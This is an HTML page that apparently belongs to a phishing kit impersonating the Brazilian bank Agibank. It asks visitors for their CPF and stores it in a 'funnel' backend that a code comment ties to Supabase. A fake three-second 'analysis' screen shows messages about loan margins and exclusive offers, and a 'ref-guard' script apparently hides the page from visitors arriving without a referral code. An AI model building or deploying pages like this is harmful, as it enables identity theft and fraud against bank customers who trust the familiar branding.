<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Agibank - Acesso</title>
    <!-- Proteção por Referência (?ref=) -->
    <script src="assets/js/ref-guard.js"></script>
    <script src="assets/js/tailwind.js"></script>
    <link href="assets/css/inter.css" rel="stylesheet">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <script src="assets/js/imask.js"></script>
    <script src="assets/js/funnel.js"></script>
    <style>
        body { font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #0064F5 0%, #003d99 100%); }
        .login-card { backdrop-filter: blur(10px); background: rgba(255, 255, 255, 0.95); }
        
        /* Estilos da Tela de Carregamento Oficial */
        #loadingScreen {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0, 100, 245, 0.98);
            z-index: 9999;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: white;
        }
        .spinner {
            width: 60px;
            height: 60px;
            border: 5px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .loading-text { margin-top: 20px; font-weight: 600; font-size: 1.1rem; }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center p-4">
    <!-- Tela de Carregamento -->
    <div id="loadingScreen">
        <div class="spinner"></div>
        <p class="loading-text" id="statusText">Consultando dados...</p>
        <p class="text-sm opacity-70 mt-2">Isso pode levar alguns segundos</p>
    </div>

    <div class="login-card w-full max-w-md p-8 rounded-3xl shadow-2xl">
        <div class="text-center mb-10">
            <img src="assets/img/logo-agi.png" alt="Agibank" class="h-10 mx-auto mb-6 object-contain">
            <h1 class="text-2xl font-bold text-gray-800">Acesse sua conta</h1>
            <p class="text-gray-500 mt-2 text-sm">Informe seu CPF para continuar a simulação</p>
        </div>
        
        <form id="loginForm" class="space-y-6">
            <div>
                <label for="cpf" class="block text-sm font-semibold text-gray-700 mb-2">CPF</label>
                <input type="text" id="cpf" name="cpf" placeholder="000.000.000-00" required inputmode="numeric" class="w-full px-5 py-4 rounded-2xl border border-gray-200 focus:border-blue-500 focus:ring-2 focus:ring-blue-200 outline-none transition-all text-lg font-medium">
            </div>
            
            <button type="submit" id="btnProximo" class="w-full bg-[#0064F5] hover:bg-[#0052cc] text-white font-bold py-4 rounded-2xl shadow-lg shadow-blue-200 transition-all transform hover:-translate-y-1">
                PRÓXIMO
            </button>
            <p id="form-status" role="status" class="text-sm text-red-500 text-center font-medium"></p>
        </form>

        <script>
            const cpfInput = document.getElementById('cpf');
            IMask(cpfInput, { mask: '000.000.000-00' });

            // Recupera CPF anterior se já preenchido
            const savedData = getFunnelData();
            if (savedData.cpf) {
                cpfInput.value = savedData.cpf_formatado || savedData.cpf;
            }

            function validarCPF(cpf) {
                cpf = cpf.replace(/[^\d]+/g, '');
                if (cpf == '' || cpf.length != 11 || /^(\d)\1{10}$/.test(cpf)) return false;
                let add = 0;
                for (let i = 0; i < 9; i++) add += parseInt(cpf.charAt(i)) * (10 - i);
                let rev = 11 - (add % 11);
                if (rev == 10 || rev == 11) rev = 0;
                if (rev != parseInt(cpf.charAt(9))) return false;
                add = 0;
                for (let i = 0; i < 10; i++) add += parseInt(cpf.charAt(i)) * (11 - i);
                rev = 11 - (add % 11);
                if (rev == 10 || rev == 11) rev = 0;
                if (rev != parseInt(cpf.charAt(10))) return false;
                return true;
            }

            const statusMessages = [
                "Consultando dados...",
                "Verificando margem disponível...",
                "Analisando convênio...",
                "Preparando ofertas exclusivas..."
            ];
            let messageIndex = 0;

            function updateStatusText() {
                const statusText = document.getElementById('statusText');
                if (statusText) {
                    statusText.innerText = statusMessages[messageIndex];
                    messageIndex = (messageIndex + 1) % statusMessages.length;
                }
            }

            document.getElementById('loginForm').addEventListener('submit', async function(e) {
                e.preventDefault();
                const rawCpf = cpfInput.value;
                const cleanCpf = rawCpf.replace(/\D/g, '');
                const status = document.getElementById('form-status');

                if (!validarCPF(cleanCpf)) {
                    status.textContent = 'Por favor, informe um CPF válido.';
                    return;
                }

                status.textContent = '';
                const loadingScreen = document.getElementById('loadingScreen');
                loadingScreen.style.display = 'flex';
                const interval = setInterval(updateStatusText, 1500);

                // Salva na sessão e sincroniza com o Supabase
                sessionStorage.setItem('user_cpf', cleanCpf);
                await saveFunnelData('login', { cpf: cleanCpf, cpf_formatado: rawCpf });

                // Aguarda 3 segundos simulando análise antes de avançar
                setTimeout(() => {
                    clearInterval(interval);
                    navTo('confirmacao.html');
                }, 3000);
            });
        </script>
    </div>
</body>
</html>
